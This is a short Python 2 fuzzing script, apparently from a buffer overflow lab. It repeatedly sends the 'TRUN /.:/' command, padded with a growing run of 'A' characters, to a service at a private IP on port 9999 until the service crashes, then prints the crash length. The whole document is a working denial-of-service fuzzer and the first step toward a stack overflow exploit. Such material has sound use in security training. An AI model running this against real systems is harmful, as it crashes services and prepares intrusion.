#!/usr/bin/python2

import sys, socket

from time import sleep

ip = '192.168.74.142'

port  = 9999


buffer = b"A" * 100

while True:
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((ip,port))

		s.send((b'TRUN /.:/' + buffer))
		s.close
		sleep(1)
		buffer = buffer + ("A"*100)

	except:
		print"Fuzzing crashed at %s bytes" % len(buffer)
		sys.exit()